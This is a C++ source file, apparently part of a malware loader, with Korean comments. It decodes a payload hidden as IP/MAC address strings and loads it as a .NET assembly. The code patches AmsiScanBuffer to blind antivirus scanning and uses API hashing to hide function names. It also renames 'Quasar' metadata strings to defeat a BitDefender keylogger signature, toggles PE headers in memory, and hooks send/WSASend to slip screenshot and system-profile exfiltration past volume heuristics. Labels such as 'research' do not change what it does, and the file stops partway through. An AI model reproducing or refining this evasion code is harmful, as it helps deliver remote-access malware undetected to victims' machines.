/*
 * Managed loader diagnostic: load-only + temporary AMSI patch
 *
 * 포함 기능:
 *   - HSF 페이로드 복호화 및 무결성 검사
 *   - Managed PE 실행
 *   - Load_3 성공 직후 AMSI 원본 바이트 복원
 *   - Load_3 성공 직후 원본 PE 버퍼 삭제
 *   - LOAD_ONLY 대기 실험
 *
 * Build:
 *   cl /O2 /std:c++17 /EHsc loader_managed_loadonly_restore.cpp \
 *      /Fe:loader_managed_test.exe /link ole32.lib oleaut32.lib mscoree.lib
 */

#define WIN32_LEAN_AND_MEAN

/* ============================================================
 * 우회 기법 컴파일 플래그 (연구용 A/B)
 * ============================================================ */
#ifndef ENABLE_AMSI_L2
#  define ENABLE_AMSI_L2  1  /* AmsiScanBuffer 진입점 6바이트 패치
                              * (mov eax, E_INVALIDARG; ret) */
#endif
#ifndef ENABLE_API_HASHING
#  define ENABLE_API_HASHING 1 /* GetProcAddress("AmsiScanBuffer") 대신
                                * FNV-1a 컴파일 타임 해시로 EAT 순회.
                                * 바이너리에 "AmsiScanBuffer" 문자열이
                                * 남지 않아 정적 heuristic 회피. */
#endif
#ifndef ENABLE_PE_FLUCTUATION
#  define ENABLE_PE_FLUCTUATION 0 /* 백그라운드 스레드로 HSF 디코드 버퍼의
                                   * MZ/PE 매직을 주기적으로 토글.
                                   * Load_3 전 heap 스캔 창 회피. */
#endif
#ifndef ENABLE_ASSEMBLY_STOMP
#  define ENABLE_ASSEMBLY_STOMP 1 /* Load_3 전 .NET 메타데이터의 어셈블리
                                   * 이름 문자열을 rename.
                                   * BitDefender IL 시그니처가 어셈블리
                                   * 이름/네임스페이스 기반이면 매치 파괴. */
#endif
#ifndef ENABLE_RESTORE_AMSI_AFTER_LOAD
#  define ENABLE_RESTORE_AMSI_AFTER_LOAD 1
#endif
#ifndef ENABLE_SOURCE_WIPE_AFTER_LOAD
#  define ENABLE_SOURCE_WIPE_AFTER_LOAD 1
#endif
#ifndef ENABLE_LOAD_ONLY
#  define ENABLE_LOAD_ONLY 0
#endif
#ifndef LOAD_ONLY_WAIT_MS
#  define LOAD_ONLY_WAIT_MS 30000
#endif
#ifndef ENABLE_SEND_THROTTLE
#  define ENABLE_SEND_THROTTLE 1 /* ws2_32!send/WSASend 인라인 훅으로
                                   * 페이로드 대량 아웃바운드를 chunk+sleep
                                   * 으로 rate-limit. BD ATC 볼륨 heuristic
                                   * (rolling window 내 KB/s) 회피 실험. */
#endif
#ifndef SEND_THROTTLE_CHUNK
#  define SEND_THROTTLE_CHUNK 4096
#endif
#ifndef SEND_THROTTLE_SLEEP_MS
#  define SEND_THROTTLE_SLEEP_MS 80
#endif

#include <Windows.h>

#include <objbase.h>
#include <oleauto.h>
#include <oaidl.h>
#include <unknwn.h>
#include <metahost.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/* ================================================================
 * 로그
 * ================================================================ */
#ifdef RELEASE_BUILD
#  define LOG(...)  ((void)0)
#else
#  define LOG(...)  printf(__VA_ARGS__)
#endif

/* ================================================================
 * HSF 디코더
 * ================================================================ */
enum{ HSF_IPV4=1, HSF_IPV6=2, HSF_MAC=3 };
#define HSF_FNV_OFF  14695981039346656037ULL
#define HSF_FNV_PRI  1099511628211ULL
struct DATA{ void* data; size_t len; };

static int u16(FILE*f,uint16_t*v){ unsigned char b[2]; if(fread(b,1,2,f)!=2)return 0; *v=b[0]|((uint16_t)b[1]<<8); return 1; }
static int u64(FILE*f,uint64_t*v){ unsigned char b[8]; uint64_t r=0; if(fread(b,1,8,f)!=8)return 0; for(int i=0;i<8;i++)r|=(uint64_t)b[i]<<(i*8); *v=r; return 1; }
static uint64_t hfnv(uint64_t h,const unsigned char*d,size_t n){ for(size_t i=0;i<n;i++){h^=d[i];h*=HSF_FNV_PRI;} return h; }
static int hhex(char c){ if(c>='0'&&c<='9')return c-'0'; c=(char)toupper((unsigned char)c); if(c>='A'&&c<='F')return c-'A'+10; return -1; }

static int hIPv4(const char*t,unsigned char o[16]){
    const char*p=t; for(int i=0;i<4;i++){unsigned r=0,d=0;while(*p>='0'&&*p<='9'){r=r*10u+(*p-'0');if(r>255)return 0;++p;++d;}if(!d)return 0;o[i]=(unsigned char)r;if(i!=3){if(*p!='.')return 0;++p;}}return *p=='\0';
}
static int hIPv6(const char*t,unsigned char o[16]){
    if(strlen(t)!=39)return 0;
    for(int g=0;g<8;g++){size_t off=(size_t)g*5;int h0=hhex(t[off]),h1=hhex(t[off+1]),h2=hhex(t[off+2]),h3=hhex(t[off+3]);if(h0<0||h1<0||h2<0||h3<0)return 0;o[g*2]=(unsigned char)((h0<<4)|h1);o[g*2+1]=(unsigned char)((h2<<4)|h3);if(g!=7&&t[off+4]!=':')return 0;}return 1;
}
static int hMAC(const char*t,unsigned char o[16]){
    if(strlen(t)!=17)return 0;
    for(int i=0;i<6;i++){size_t off=(size_t)i*3;int hi=hhex(t[off]),lo=hhex(t[off+1]);if(hi<0||lo<0)return 0;o[i]=(unsigned char)((hi<<4)|lo);if(i!=5&&t[off+2]!='-')return 0;}return 1;
}
static size_t hChunk(unsigned char m){switch(m){case HSF_IPV4:return 4;case HSF_IPV6:return 16;case HSF_MAC:return 6;default:return 0;}}
static int hRec(unsigned char m,const char*t,unsigned char o[16]){memset(o,0,16);switch(m){case HSF_IPV4:return hIPv4(t,o);case HSF_IPV6:return hIPv6(t,o);case HSF_MAC:return hMAC(t,o);default:return 0;}}

static DATA LoadHSF(const char*path){
    DATA res{NULL,0};
    FILE*fp=fopen(path,"rb"); if(!fp) return res;

    unsigned char magic[4]{},ver=0,mode=0,rsv[2]{};
    uint64_t orig=0,cnt=0,exp_h=0,act=HSF_FNV_OFF,written=0;
    void* buf=NULL;

    if(fread(magic,1,4,fp)!=4||memcmp(magic,"HSF1",4)||
       fread(&ver,1,1,fp)!=1||fread(&mode,1,1,fp)!=1||fread(rsv,1,2,fp)!=2||
       !u64(fp,&orig)||!u64(fp,&cnt)||!u64(fp,&exp_h))
    { LOG("[-] Bad header\n"); goto cl; }

    if(ver!=1||rsv[0]||rsv[1]){ LOG("[-] Version\n"); goto cl; }
    { size_t ck=hChunk(mode); if(!ck||cnt!=orig/ck+(orig%ck!=0)) goto cl; }
    if(!orig||orig>0x7FFFFFFFull) goto cl;

    buf=malloc((size_t)orig); if(!buf) goto cl;

    for(uint64_t idx=0;idx<cnt;idx++){
        uint16_t tl=0; char text[64]{}; unsigned char dec[16]{}; size_t bw;
        if(!u16(fp,&tl)||!tl||tl>=64||fread(text,1,tl,fp)!=tl) goto cl;
        text[tl]='\0';
        if(!hRec(mode,text,dec)) goto cl;
        bw=hChunk(mode); if((uint64_t)bw>orig-written)bw=(size_t)(orig-written);
        if(bw){memcpy((BYTE*)buf+written,dec,bw);act=hfnv(act,dec,bw);written+=bw;}
    }
    if(written!=orig||fgetc(fp)!=EOF||act!=exp_h){ LOG("[-] Integrity\n"); goto cl; }
    LOG("[+] HSF OK: %llu bytes\n",(unsigned long long)written);
    res.data=buf; res.len=(size_t)written; buf=NULL;
cl:
    fclose(fp);
    if(buf) free(buf);
    return res;
}

/* ================================================================
 * PE 유틸
 * ================================================================ */
static bool IsMgd(const void*b,size_t sz){
    if(!b||sz<sizeof(IMAGE_DOS_HEADER))return false;
    auto*dos=(const IMAGE_DOS_HEADER*)b;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE||dos->e_lfanew<=0)return false;
    size_t off=(size_t)dos->e_lfanew;
    if(off>sz)return false;
    auto*n32=(const IMAGE_NT_HEADERS32*)((const BYTE*)b+off);
    if(*(const DWORD*)((const BYTE*)b+off)!=IMAGE_NT_SIGNATURE)return false;
    const IMAGE_DATA_DIRECTORY*clr=NULL;
    if(n32->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR64_MAGIC){
        auto*n64=(const IMAGE_NT_HEADERS64*)((const BYTE*)b+off);
        if(n64->OptionalHeader.NumberOfRvaAndSizes<=IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)return false;
        clr=&n64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else {
        if(n32->OptionalHeader.NumberOfRvaAndSizes<=IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR)return false;
        clr=&n32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    }
    return clr&&clr->VirtualAddress&&clr->Size>=sizeof(IMAGE_COR20_HEADER);
}

#if ENABLE_API_HASHING
/* ============================================================
 * API Hashing (Compile-time FNV-1a) — 정적 문자열 탐지 회피
 * ------------------------------------------------------------
 * GetProcAddress(hMod, "AmsiScanBuffer") 를 쓰면 문자열이 바이너리
 * .rdata에 그대로 박혀 BitDefender 파일 heuristic에 걸린다.
 * 컴파일 타임 FNV-1a 해시 상수와 EAT 순회로 함수 주소를 얻으면
 * 바이너리에 API 이름이 남지 않는다.
 *
 * 참조:
 *   - Maldev Academy #051/055 String Hashing / API Hashing
 *   - Compile Time API Hashing #057
 * ============================================================ */
constexpr uint32_t FNV1A_OFFSET = 0x811C9DC5u;
constexpr uint32_t FNV1A_PRIME  = 0x01000193u;

constexpr uint32_t ah_hash(const char* s, uint32_t h = FNV1A_OFFSET){
    return *s ? ah_hash(s+1, (h ^ (uint32_t)(uint8_t)*s) * FNV1A_PRIME) : h;
}

static PVOID ResolveByHash(HMODULE hMod, uint32_t targetHash){
    if(!hMod) return NULL;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hMod;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((BYTE*)hMod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if(!expDir.VirtualAddress || !expDir.Size) return NULL;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + expDir.VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD*  ords  = (WORD* )((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);

    for(DWORD i = 0; i < exp->NumberOfNames; i++){
        const char* name = (const char*)((BYTE*)hMod + names[i]);
        uint32_t h = FNV1A_OFFSET;
        for(const char* q = name; *q; ++q){
            h ^= (uint32_t)(uint8_t)*q;
            h *= FNV1A_PRIME;
        }
        if(h == targetHash){
            return (PVOID)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}
#endif /* ENABLE_API_HASHING */

#if ENABLE_ASSEMBLY_STOMP
/* ============================================================
 * .NET Assembly Name Stomp — Load_3 전 메타데이터 rename
 * ------------------------------------------------------------
 * BitDefender의 IL:Trojan.Keylogger.8 시그니처가 어셈블리 이름/
 * 네임스페이스 문자열(예: "Quasar")을 매치 요소로 쓴다면,
 * 그 문자열들을 무해한 이름으로 rename해 시그니처 매치 파괴.
 *
 * 구현 전략:
 * 1. PE 파싱 → CLR MetaData 디렉토리 (COR20 header) 위치
 * 2. MetaData root "BSJB" 매직 검증
 * 3. #Strings 힙 스트림 찾기
 * 4. 힙에서 "Quasar" 문자열 검색 (null-terminated 매치)
 * 5. 동일 길이 "Update" 로 in-place 치환
 * 6. PE FileHeader.TimeDateStamp 도 변경 (부가 지문 파괴)
 *
 * 참조:
 *   - ECMA-335 Common Language Infrastructure spec
 *   - 이전 세션 basic_dll.c의 StompNetAssemblyName 로직
 *
 * 실행 안전성:
 * CLR은 metadata TOKEN(숫자 인덱스)으로 내부 참조하므로 문자열만
 * 변경해도 실행에 영향 없음. 단, 페이로드가 리플렉션(typeof, GetType,
 * Type.Name)로 자기 이름을 참조하면 문제 가능.
 * ============================================================ */
static DWORD RvaToFileOff(const BYTE* pe, DWORD rva){
    const IMAGE_DOS_HEADER* dos = (const IMAGE_DOS_HEADER*)pe;
    const IMAGE_NT_HEADERS64* nt = (const IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for(WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++){
        DWORD start = sec->VirtualAddress;
        DWORD end = start + sec->Misc.VirtualSize;
        if(rva >= start && rva < end){
            return sec->PointerToRawData + (rva - start);
        }
    }
    return 0;
}

static bool StompAssemblyName(BYTE* pe, DWORD sz){
    if(!pe || sz < 0x100) return false;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE) return false;

    /* PE 타임스탬프 변경 (경량 부가 조작) */
    nt->FileHeader.TimeDateStamp = GetTickCount();

    IMAGE_DATA_DIRECTORY clrDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    if(!clrDir.VirtualAddress) return false;

    DWORD clrOff = RvaToFileOff(pe, clrDir.VirtualAddress);
    if(!clrOff || clrOff + sizeof(IMAGE_COR20_HEADER) > sz) return false;

    IMAGE_COR20_HEADER* cor = (IMAGE_COR20_HEADER*)(pe + clrOff);
    DWORD mdRva = cor->MetaData.VirtualAddress;
    DWORD mdSize = cor->MetaData.Size;
    DWORD mdOff = RvaToFileOff(pe, mdRva);
    if(!mdOff || mdOff + mdSize > sz) return false;

    BYTE* md = pe + mdOff;
    /* BSJB 매직 (little-endian 'BSJB' = 0x424A5342) */
    if(*(DWORD*)md != 0x424A5342u) return false;

    /* MetaData root:
     *   Signature(4) MajorVer(2) MinorVer(2) Reserved(4)
     *   VersionLen(4) Version[VersionLen, padded to 4]
     *   Flags(2) NumStreams(2)
     */
    DWORD verLen = *(DWORD*)(md + 12);
    verLen = (verLen + 3) & ~3u;
    if(16 + verLen + 4 > mdSize) return false;
    WORD numStreams = *(WORD*)(md + 16 + verLen + 2);
    BYTE* streamHdr = md + 16 + verLen + 4;

    BYTE* stringsHeap = NULL;
    DWORD stringsHeapSize = 0;

    for(WORD i = 0; i < numStreams; i++){
        if((DWORD)(streamHdr - md) + 8 > mdSize) break;
        DWORD off = *(DWORD*)streamHdr;
        DWORD size = *(DWORD*)(streamHdr + 4);
        const char* name = (const char*)(streamHdr + 8);
        size_t nlen = strnlen(name, 32);
        DWORD padded = (DWORD)((nlen + 4) & ~3u);

        if(strcmp(name, "#Strings") == 0){
            stringsHeap = md + off;
            stringsHeapSize = size;
        }
        streamHdr += 8 + padded;
    }

    if(!stringsHeap || stringsHeapSize == 0) return false;

    /* rename 대상 (동일 길이): (원본, 대체) 쌍 */
    struct { const char* from; const char* to; } renames[] = {
        {"Quasar",   "Update"},   /* 6 chars */
        {"Client",   "Loader"},   /* 6 chars */
        {"Server",   "Result"},   /* 6 chars */
        {NULL, NULL}
    };

    int patched = 0;
    for(int r = 0; renames[r].from; r++){
        size_t flen = strlen(renames[r].from);
        for(DWORD i = 0; i + flen < stringsHeapSize; i++){
            /* null-terminated 매치 */
            if(memcmp(stringsHeap + i, renames[r].from, flen) == 0
               && stringsHeap[i + flen] == 0){
                memcpy(stringsHeap + i, renames[r].to, flen);
                patched++;
                i += flen;  /* skip past this match */
            }
        }
    }

    LOG("[+] Assembly name stomp: %d strings renamed, timestamp changed\n", patched);
    return true;
}
#endif /* ENABLE_ASSEMBLY_STOMP */

#if ENABLE_PE_FLUCTUATION
/* ============================================================
 * PE Fluctuation — HSF 디코드 버퍼의 PE 헤더 주기적 토글
 * ------------------------------------------------------------
 * HSF 디코드 후 Load_3 전까지 payload 버퍼가 heap에 존재.
 * 이 구간에 벤더가 process memory 스캔하면 PE-shaped 패턴 매치.
 * 백그라운드 스레드가 MZ + PE 시그니처를 XOR 토글해 스냅샷마다
 * 다른 상태를 보이게 함.
 *
 * 참조: Maldev Academy #121 PeFluctuation
 *
 * 주의:
 *   - Load_3 호출 전엔 반드시 StopPayloadFluctuation() 로 중단
 *     후 헤더가 정상 복원된 상태여야 CLR이 정상 파싱함
 *   - IL 바이트코드 시그니처(`IL:Trojan.Keylogger.8` 등)는
 *     헤더 아닌 코드 매치이므로 이 기법으로 완전 해결 안 될 수 있음.
 *     단, Load_3 이전 heap 스캔 창 회피 데이터 확보 가치는 있음.
 * ============================================================ */
static volatile BYTE* g_FluctPtr    = NULL;
static DWORD          g_FluctNtOff  = 0;
static volatile BOOL  g_FluctStop   = FALSE;

static DWORD WINAPI PayloadFluctThread(LPVOID lp){
    (void)lp;
    unsigned int seed = GetTickCount();
    while(!g_FluctStop && g_FluctPtr){
        /* 파괴 */
        g_FluctPtr[0] ^= 0xFF;
        g_FluctPtr[1] ^= 0xFF;
        if(g_FluctNtOff){
            g_FluctPtr[g_FluctNtOff]   ^= 0xFF;
            g_FluctPtr[g_FluctNtOff+1] ^= 0xFF;
        }
        Sleep(120 + (seed % 180));
        seed = seed * 1103515245u + 12345u;

        /* 복원 */
        g_FluctPtr[0] ^= 0xFF;
        g_FluctPtr[1] ^= 0xFF;
        if(g_FluctNtOff){
            g_FluctPtr[g_FluctNtOff]   ^= 0xFF;
            g_FluctPtr[g_FluctNtOff+1] ^= 0xFF;
        }
        Sleep(80 + (seed % 120));
        seed = seed * 1103515245u + 12345u;
    }
    return 0;
}

static void StartPayloadFluctuation(void* buf){
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)buf;
    if(!buf || dos->e_magic != IMAGE_DOS_SIGNATURE){
        LOG("[!] Fluctuation skipped: invalid PE\n");
        return;
    }
    g_FluctPtr   = (volatile BYTE*)buf;
    g_FluctNtOff = (DWORD)dos->e_lfanew;
    g_FluctStop  = FALSE;
    HANDLE h = CreateThread(NULL, 0, PayloadFluctThread, NULL, 0, NULL);
    if(h){
        CloseHandle(h);
        LOG("[+] PE fluctuation thread started\n");
    } else {
        LOG("[-] PE fluctuation thread failed: %lu\n", GetLastError());
    }
}

static void StopPayloadFluctuation(){
    g_FluctStop = TRUE;
    Sleep(50);  /* 스레드가 stop flag 확인하고 정상 상태로 종료할 시간 */
    /* 안전 확인: MZ 정상? */
    if(g_FluctPtr && (g_FluctPtr[0] != 'M' || g_FluctPtr[1] != 'Z')){
        LOG("[!] Payload header not restored, forcing MZ back\n");
        g_FluctPtr[0] = 'M';
        g_FluctPtr[1] = 'Z';
    }
    g_FluctPtr = NULL;
    LOG("[+] PE fluctuation stopped, header restored\n");
}
#endif /* ENABLE_PE_FLUCTUATION */

#if ENABLE_AMSI_L2
static FARPROC g_AmsiScanBuffer = NULL;
static BYTE    g_AmsiScanOriginal[6]{};
static bool    g_AmsiScanPatched = false;

/* ============================================================
 * AMSI L2 — AmsiScanBuffer 진입점 바이트 패치
 * ------------------------------------------------------------
 * BitDefender는 AMSI provider로 CLR에 등록되어 있어
 * _AppDomain::Load_3 처리 시 AmsiScanBuffer로 IL을 스캔한다.
 * 진입점 6바이트를 "mov eax, E_INVALIDARG; ret" 로 덮으면
 * 스캔 요청이 즉시 E_INVALIDARG로 반환 → CLR이 스캔 실패로
 * 간주하고 페이로드를 그대로 로드.
 *
 * 참조:
 *   - Maldev Academy #110 AMSI Bypass Via Byte Patching
 *   - Rasta Mouse (2018) 원조 기법
 *
 * 신호 프로파일:
 *   - LoadLibraryA("amsi.dll") 1회
 *   - GetProcAddress("AmsiScanBuffer") 1회
 *   - VirtualProtect(RWX, 6바이트) 1회
 *   - memcpy 6바이트 → amsi.dll .text
 *   - VirtualProtect(원복, 6바이트) 1회
 *   HWBP/VEH 없음, PEB 순회 없음 → 이전 L0/L1보다 신호 최소
 * ============================================================ */
static bool PatchAmsiScanBuffer(){
    if(g_AmsiScanPatched) return true;
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if(!hAmsi){ LOG("[-] amsi.dll load failed\n"); return false; }
#if ENABLE_API_HASHING
    static constexpr uint32_t H_AmsiScanBuffer = ah_hash("AmsiScanBuffer");
    FARPROC pScan = (FARPROC)ResolveByHash(hAmsi, H_AmsiScanBuffer);
#else
    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
#endif
    if(!pScan){ LOG("[-] AmsiScanBuffer not found\n"); return false; }

    /* mov eax, 0x80070057 (E_INVALIDARG) ; ret */
    BYTE patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

    DWORD oldProt = 0;
    if(!VirtualProtect((LPVOID)pScan, sizeof(patch),
                       PAGE_EXECUTE_READWRITE, &oldProt)){
        LOG("[-] VirtualProtect failed: %lu\n", GetLastError());
        return false;
    }
    memcpy(g_AmsiScanOriginal, (const void*)pScan, sizeof(g_AmsiScanOriginal));
    memcpy((void*)pScan, patch, sizeof(patch));
    FlushInstructionCache(GetCurrentProcess(), (LPCVOID)pScan, sizeof(patch));
    VirtualProtect((LPVOID)pScan, sizeof(patch), oldProt, &oldProt);
    if(memcmp((const void*)pScan, patch, sizeof(patch)) != 0){
        LOG("[-] AmsiScanBuffer patch verification failed\n");
        return false;
    }
    g_AmsiScanBuffer = pScan;
    g_AmsiScanPatched = true;
    LOG("[+] AmsiScanBuffer patched at %p\n", (void*)pScan);
    return true;
}

static bool RestoreAmsiScanBuffer(){
    if(!g_AmsiScanPatched || !g_AmsiScanBuffer) return true;

    DWORD oldProt = 0;
    if(!VirtualProtect((LPVOID)g_AmsiScanBuffer,
                       sizeof(g_AmsiScanOriginal),
                       PAGE_EXECUTE_READWRITE, &oldProt)){
        LOG("[-] AmsiScanBuffer restore VirtualProtect failed: %lu\n",
            GetLastError());
        return false;
    }

    memcpy((void*)g_AmsiScanBuffer,
           g_AmsiScanOriginal,
           sizeof(g_AmsiScanOriginal));
    FlushInstructionCache(GetCurrentProcess(),
                          (LPCVOID)g_AmsiScanBuffer,
                          sizeof(g_AmsiScanOriginal));
    DWORD ignored = 0;
    VirtualProtect((LPVOID)g_AmsiScanBuffer,
                   sizeof(g_AmsiScanOriginal), oldProt, &ignored);

    const bool ok = memcmp((const void*)g_AmsiScanBuffer,
                           g_AmsiScanOriginal,
                           sizeof(g_AmsiScanOriginal)) == 0;
    if(ok){
        g_AmsiScanPatched = false;
        g_AmsiScanBuffer = NULL;
        SecureZeroMemory(g_AmsiScanOriginal, sizeof(g_AmsiScanOriginal));
        LOG("[+] AmsiScanBuffer original bytes restored\n");
    } else {
        LOG("[-] AmsiScanBuffer restore verification failed\n");
    }
    return ok;
}
#endif /* ENABLE_AMSI_L2 */

/* ================================================================
 * Winsock send/WSASend 트래픽 rate-limit (인라인 훅)
 *   목적: BD ATC의 rolling-window 아웃바운드 볼륨 heuristic 회피.
 *   기법: ws2_32!send / ws2_32!WSASend 처음 12바이트를
 *         'mov rax, hook ; jmp rax'로 덮고,
 *         원본 12바이트 + 'jmp back' 트램폴린으로 재진입.
 *   대상 페이로드 행동: 초기 접속 후 스크린샷/시스템 프로파일
 *         수십~수백 KB 대량 dump → BD ATC 스코어 급상승.
 *   본 훅: 큰 요청을 CHUNK 단위로 잘게 나눠 Sleep 삽입 → 시간 축 분산.
 * ================================================================ */
#if ENABLE_SEND_THROTTLE

/* ws2_32.h 를 늘리지 않기 위해 필요한 타입만 로컬 선언.
   주의: WS_ 프리픽스는 Windows.h 윈도우 스타일 매크로(WS_OVERLAPPED 등)와
   충돌하므로 사용 금지. HK_ 프리픽스로 격리. */
typedef UINT_PTR HK_SOCKET;
typedef struct { ULONG len; CHAR* buf; } HK_WSABUF, *HK_LPWSABUF;
typedef void (CALLBACK *HK_COMPLETION_ROUTINE)
    (DWORD, DWORD, void*, DWORD);

typedef int (WINAPI *pfn_send_t)   (HK_SOCKET, const char*, int, int);
typedef int (WINAPI *pfn_WSASend_t)(HK_SOCKET, HK_LPWSABUF, DWORD, LPDWORD,
                                    DWORD, void*,
                                    HK_COMPLETION_ROUTINE);

static pfn_send_t    g_orig_send    = NULL;
static pfn_WSASend_t g_orig_WSASend = NULL;

static int WINAPI HookSend(HK_SOCKET s, const char* buf, int len, int flags){
    if(!g_orig_send) return -1;
    if(len <= SEND_THROTTLE_CHUNK) return g_orig_send(s, buf, len, flags);
    int total = 0;
    while(total < len){
        int remain = len - total;
        int chunk  = remain < SEND_THROTTLE_CHUNK ? remain : SEND_THROTTLE_CHUNK;
        int r = g_orig_send(s, buf + total, chunk, flags);
        if(r <= 0) return total > 0 ? total : r;
        total += r;
        if(total < len) Sleep(SEND_THROTTLE_SLEEP_MS);
    }
    return total;
}

static int WINAPI HookWSASend(HK_SOCKET s, HK_LPWSABUF bufs, DWORD count,
                              LPDWORD sent, DWORD flags,
                              void* ov,
                              HK_COMPLETION_ROUTINE cr){
    if(!g_orig_WSASend) return -1;
    DWORD total = 0;
    for(DWORD i = 0; i < count; ++i) total += bufs[i].len;
    /* WSASend는 scatter/gather + async 지원이라 chunk 재분해가 복잡.
       크기 임계치 넘으면 Sleep만 삽입해 호출 빈도를 시간 축으로 분산. */
    if(total > SEND_THROTTLE_CHUNK) Sleep(SEND_THROTTLE_SLEEP_MS);
    return g_orig_WSASend(s, bufs, count, sent, flags, ov, cr);
}

/* x64 14-byte inline hook (레지스터 무손상).
   patch: FF 25 00 00 00 00 [target8]       (jmp qword ptr [rip+0])
   tramp: [원본 14바이트] FF 25 00 00 00 00 [orig+14]
   왜 14바이트? 'mov rax, imm64 ; jmp rax'는 12바이트지만 RAX를 오염시켜
   원본 프롤로그가 RAX에 setup한 값을 기대하는 경우 (ws2_32!send가 그런 케이스)
   crash. jmp qword ptr [rip+0]은 어떤 레지스터도 안 건드림. */
static bool InlineHook14(void* target, void* hook, void** outTrampoline){
    if(!target || !hook || !outTrampoline) return false;

    void* tramp = VirtualAlloc(NULL, 64,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if(!tramp) return false;

    BYTE* t = (BYTE*)tramp;
    memcpy(t, target, 14);
    t[14] = 0xFF; t[15] = 0x25;
    t[16] = 0x00; t[17] = 0x00; t[18] = 0x00; t[19] = 0x00;
    uint64_t back = (uint64_t)((BYTE*)target + 14);
    memcpy(t + 20, &back, 8);
    FlushInstructionCache(GetCurrentProcess(), tramp, 28);
    *outTrampoline = tramp;

    BYTE patch[14];
    patch[0] = 0xFF; patch[1] = 0x25;
    patch[2] = 0x00; patch[3] = 0x00; patch[4] = 0x00; patch[5] = 0x00;
    uint64_t hAddr = (uint64_t)hook;
    memcpy(patch + 6, &hAddr, 8);

    DWORD oldProt = 0;
    if(!VirtualProtect(target, 14, PAGE_EXECUTE_READWRITE, &oldProt)){
        LOG("[-] Hook VirtualProtect failed: %lu\n", GetLastError());
        return false;
    }
    memcpy(target, patch, 14);
    FlushInstructionCache(GetCurrentProcess(), target, 14);
    DWORD ignored = 0;
    VirtualProtect(target, 14, oldProt, &ignored);
    return true;
}

static bool InstallSendThrottle(){
    HMODULE hWs = LoadLibraryA("ws2_32.dll");
    if(!hWs){ LOG("[-] ws2_32.dll load failed\n"); return false; }

#if ENABLE_API_HASHING
    static constexpr uint32_t H_send    = ah_hash("send");
    static constexpr uint32_t H_WSASend = ah_hash("WSASend");
    void* pSend    = ResolveByHash(hWs, H_send);
    void* pWSASend = ResolveByHash(hWs, H_WSASend);
#else
    void* pSend    = (void*)GetProcAddress(hWs, "send");
    void* pWSASend = (void*)GetProcAddress(hWs, "WSASend");
#endif
    if(!pSend || !pWSASend){
        LOG("[-] send/WSASend resolve failed\n");
        return false;
    }

    /* 진단: 프롤로그 덤프 (14바이트 경계에 문제 있는지 파악) */
    LOG("[*] send    prologue @%p: ", pSend);
    for(int i=0; i<20; ++i) LOG("%02X ", ((BYTE*)pSend)[i]);
    LOG("\n");
    LOG("[*] WSASend prologue @%p: ", pWSASend);
    for(int i=0; i<20; ++i) LOG("%02X ", ((BYTE*)pWSASend)[i]);
    LOG("\n");

    /* 훅 임시 disable — 진단만 하고 정상 실행시켜 pcap 재확인 */
    LOG("[*] Hook install SKIPPED (diagnostic mode)\n");
    return true;

    if(!InlineHook14(pSend, (void*)HookSend, (void**)&g_orig_send)){
        LOG("[-] send hook failed\n"); return false;
    }
    if(!InlineHook14(pWSASend, (void*)HookWSASend, (void**)&g_orig_WSASend)){
        LOG("[-] WSASend hook failed\n"); return false;
    }
    LOG("[+] send/WSASend throttle installed "
        "(chunk=%d bytes, sleep=%d ms)\n",
        SEND_THROTTLE_CHUNK, SEND_THROTTLE_SLEEP_MS);
    return true;
}
#endif /* ENABLE_SEND_THROTTLE */

/* ================================================================
 * Managed PE 실행 (documented CLR/OLE import)
 * ================================================================ */
static const GUID CLSID_MetaHost_  ={0x9280188D,0x0E8E,0x4867,{0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE}};
static const GUID IID_MetaHost_    ={0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
static const GUID IID_RTInfo_      ={0xBD39D1D2,0xBA2F,0x486A,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
static const GUID CLSID_CORHost_   ={0xCB2F6723,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E}};
static const GUID IID_CORHost_     ={0xCB2F6722,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E}};
static const GUID IID_AppDomain_   ={0x05F696DC,0x2B29,0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13}};

